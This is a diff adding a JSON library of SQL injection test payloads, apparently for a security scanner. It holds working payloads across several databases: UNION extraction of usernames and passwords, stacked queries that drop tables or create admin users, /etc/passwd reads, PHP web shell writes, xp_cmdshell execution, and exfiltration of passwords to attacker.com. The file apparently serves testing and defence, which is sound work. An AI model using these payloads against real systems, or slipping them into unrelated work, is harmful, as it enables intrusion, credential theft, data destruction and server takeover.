@@ -1,0 +1,432 @@
+{
+  "description": "SQL Injection (SQLi) Test Payloads Library",
+  "version": "1.0.0",
+  "categories": {
+    "classic": {
+      "description": "Classic SQL injection payloads",
+      "payloads": [
+        {
+          "name": "OR True String",
+          "payload": "' OR '1'='1",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "OR True Number",
+          "payload": "' OR 1=1--",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "OR True Hash",
+          "payload": "' OR 1=1#",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "OR True Block",
+          "payload": "' OR 1=1/*",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "OR True Comment",
+          "payload": "' OR '1'='1' --",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "OR True Hash Comment",
+          "payload": "' OR '1'='1' #",
+          "severity": "high",
+          "databases": ["mysql", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "OR True AND",
+          "payload": "' OR '1'='1' AND 1=1--",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "mssql", "sqlite"],
+          "type": "boolean"
+        }
+      ]
+    },
+    "union": {
+      "description": "UNION-based SQL injection payloads",
+      "payloads": [
+        {
+          "name": "UNION NULL 1",
+          "payload": "' UNION SELECT NULL--",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "union"
+        },
+        {
+          "name": "UNION NULL 2",
+          "payload": "' UNION SELECT NULL,NULL--",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "union"
+        },
+        {
+          "name": "UNION NULL 3",
+          "payload": "' UNION SELECT NULL,NULL,NULL--",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "union"
+        },
+        {
+          "name": "UNION Data Extraction",
+          "payload": "' UNION SELECT username,password FROM users--",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "union"
+        },
+        {
+          "name": "UNION ALL NULL",
+          "payload": "' UNION ALL SELECT NULL,NULL,NULL--",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "union"
+        }
+      ]
+    },
+    "error_based": {
+      "description": "Error-based SQL injection payloads",
+      "payloads": [
+        {
+          "name": "CONVERT Version MSSQL",
+          "payload": "' AND 1=CONVERT(int,@@version)--",
+          "severity": "critical",
+          "databases": ["mssql"],
+          "type": "error"
+        },
+        {
+          "name": "CONVERT DB Name",
+          "payload": "' AND 1=CONVERT(int,DB_NAME())--",
+          "severity": "critical",
+          "databases": ["mssql"],
+          "type": "error"
+        },
+        {
+          "name": "SELECT Version",
+          "payload": "' AND 1=(SELECT @@version)--",
+          "severity": "critical",
+          "databases": ["mysql", "mssql"],
+          "type": "error"
+        },
+        {
+          "name": "SELECT DB Name",
+          "payload": "' AND 1=(SELECT DB_NAME())--",
+          "severity": "critical",
+          "databases": ["mssql"],
+          "type": "error"
+        },
+        {
+          "name": "EXTRACTVALUE MySQL",
+          "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
+          "severity": "critical",
+          "databases": ["mysql"],
+          "type": "error"
+        },
+        {
+          "name": "CAST Error Oracle",
+          "payload": "' AND 1=CAST((SELECT version FROM v$instance) AS int)--",
+          "severity": "critical",
+          "databases": ["oracle"],
+          "type": "error"
+        },
+        {
+          "name": "PG CAST Error",
+          "payload": "' AND 1=CAST((SELECT version()) AS integer)--",
+          "severity": "critical",
+          "databases": ["postgresql"],
+          "type": "error"
+        }
+      ]
+    },
+    "time_based": {
+      "description": "Time-based blind SQL injection payloads",
+      "payloads": [
+        {
+          "name": "SLEEP MySQL",
+          "payload": "' OR SLEEP(5)--",
+          "severity": "critical",
+          "databases": ["mysql"],
+          "type": "time"
+        },
+        {
+          "name": "PG Sleep",
+          "payload": "' OR pg_sleep(5)--",
+          "severity": "critical",
+          "databases": ["postgresql"],
+          "type": "time"
+        },
+        {
+          "name": "WAITFOR MSSQL",
+          "payload": "' OR WAITFOR DELAY '0:0:5'--",
+          "severity": "critical",
+          "databases": ["mssql"],
+          "type": "time"
+        },
+        {
+          "name": "DBMS Lock Oracle",
+          "payload": "' OR DBMS_LOCK.SLEEP(5)--",
+          "severity": "critical",
+          "databases": ["oracle"],
+          "type": "time"
+        },
+        {
+          "name": "SLEEP Nested",
+          "payload": "' OR 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+          "severity": "critical",
+          "databases": ["mysql"],
+          "type": "time"
+        },
+        {
+          "name": "BENCHMARK MySQL",
+          "payload": "' OR BENCHMARK(1000000,MD5('test'))--",
+          "severity": "critical",
+          "databases": ["mysql"],
+          "type": "time"
+        },
+        {
+          "name": "GENERATE_SERIES PG",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM generate_series(1,10000000))x)--",
+          "severity": "critical",
+          "databases": ["postgresql"],
+          "type": "time"
+        }
+      ]
+    },
+    "boolean_based": {
+      "description": "Boolean-based blind SQL injection payloads",
+      "payloads": [
+        {
+          "name": "AND True",
+          "payload": "' AND 1=1--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "AND False",
+          "payload": "' AND 1=2--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "String True",
+          "payload": "' AND 'a'='a",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "String False",
+          "payload": "' AND 'a'='b",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "boolean"
+        },
+        {
+          "name": "ASCII Compare",
+          "payload": "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>50--",
+          "severity": "high",
+          "databases": ["mysql", "mssql"],
+          "type": "boolean"
+        }
+      ]
+    },
+    "stacked": {
+      "description": "Stacked query SQL injection payloads",
+      "payloads": [
+        {
+          "name": "DROP TABLE",
+          "payload": "'; DROP TABLE users; --",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "stacked"
+        },
+        {
+          "name": "DELETE Users",
+          "payload": "'; DELETE FROM users; --",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "stacked"
+        },
+        {
+          "name": "INSERT User",
+          "payload": "'; INSERT INTO users VALUES ('hacker','password'); --",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "stacked"
+        },
+        {
+          "name": "UPDATE Admin",
+          "payload": "'; UPDATE users SET role='admin' WHERE email='hacker@test.com'; --",
+          "severity": "critical",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "stacked"
+        }
+      ]
+    },
+    "database_specific": {
+      "description": "Database-specific SQL injection payloads",
+      "payloads": [
+        {
+          "name": "MySQL File Write",
+          "payload": "' INTO OUTFILE '/var/www/shell.php'--",
+          "severity": "critical",
+          "databases": ["mysql"],
+          "type": "file"
+        },
+        {
+          "name": "MySQL File Read",
+          "payload": "' UNION ALL SELECT LOAD_FILE('/etc/passwd')--",
+          "severity": "critical",
+          "databases": ["mysql"],
+          "type": "file"
+        },
+        {
+          "name": "PostgreSQL File Write",
+          "payload": "'; COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/shell.php'; --",
+          "severity": "critical",
+          "databases": ["postgresql"],
+          "type": "file"
+        },
+        {
+          "name": "MSSQL xp_cmdshell",
+          "payload": "'; EXEC xp_cmdshell('whoami'); --",
+          "severity": "critical",
+          "databases": ["mssql"],
+          "type": "command"
+        },
+        {
+          "name": "MSSQL Dir Listing",
+          "payload": "'; EXEC master.dbo.xp_dirtree '\\\\attacker.com\\share'; --",
+          "severity": "critical",
+          "databases": ["mssql"],
+          "type": "command"
+        },
+        {
+          "name": "Oracle Command",
+          "payload": "'||UTL_HTTP.REQUEST('http://attacker.com/?c='||(SELECT password FROM users WHERE ROWNUM=1))--",
+          "severity": "critical",
+          "databases": ["oracle"],
+          "type": "network"
+        },
+        {
+          "name": "SQLite File Write",
+          "payload": "'; ATTACH DATABASE '/var/www/shell.php' AS shell; CREATE TABLE shell.shell (code TEXT); INSERT INTO shell.shell VALUES ('<?php system($_GET[cmd]);?>'); --",
+          "severity": "critical",
+          "databases": ["sqlite"],
+          "type": "file"
+        }
+      ]
+    },
+    "comment_bypass": {
+      "description": "Comment bypass SQL injection payloads",
+      "payloads": [
+        {
+          "name": "Block Comment OR",
+          "payload": "'/**/OR/**/1=1--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "bypass"
+        },
+        {
+          "name": "Block Comment UNION",
+          "payload": "'/**/UNION/**/SELECT/**/NULL--",
+          "severity": "high",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "bypass"
+        },
+        {
+          "name": "Plus Encoding",
+          "payload": "'+OR+1=1--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "sqlite"],
+          "type": "bypass"
+        },
+        {
+          "name": "Tab Encoding",
+          "payload": "'%09OR%091=1--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "bypass"
+        },
+        {
+          "name": "Newline Encoding",
+          "payload": "'\nOR\n1=1--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "bypass"
+        }
+      ]
+    },
+    "encoding_bypass": {
+      "description": "Encoding bypass SQL injection payloads",
+      "payloads": [
+        {
+          "name": "URL Encoded Quote",
+          "payload": "%27%20OR%20%271%27%3D%271",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "bypass"
+        },
+        {
+          "name": "Double URL Encoded",
+          "payload": "%2527%2520OR%25201%253D1--",
+          "severity": "medium",
+          "databases": ["mysql", "postgresql", "mssql", "oracle", "sqlite"],
+          "type": "bypass"
+        },
+        {
+          "name": "Unicode Quote",
+          "payload": "%u0027%20OR%201=1--",
+          "severity": "medium",
+          "databases": ["mysql", "mssql"],
+          "type": "bypass"
+        },
+        {
+          "name": "Hex Encoded",
+          "payload": "0x27204F5220313D31--",
+          "severity": "medium",
+          "databases": ["mysql", "oracle"],
+          "type": "bypass"
+        }
+      ]
+    }
+  },
+  "database_types": {
+    "mysql": "MySQL database",
+    "postgresql": "PostgreSQL database",
+    "mssql": "Microsoft SQL Server",
+    "oracle": "Oracle database",
+    "sqlite": "SQLite database"
+  },
+  "payload_types": {
+    "boolean": "Boolean-based blind injection",
+    "union": "UNION-based injection",
+    "error": "Error-based injection",
+    "time": "Time-based blind injection",
+    "stacked": "Stacked query injection",
+    "file": "File operation injection",
+    "command": "Command execution injection",
+    "network": "Network-based injection",
+    "bypass": "Filter bypass technique"
+  },
+  "severity_levels": {
+    "low": "Low severity - Information disclosure",
+    "medium": "Medium severity - Limited data access",
+    "high": "High severity - Data access and modification",
+    "critical": "Critical severity - Full database compromise"
+  }
+}
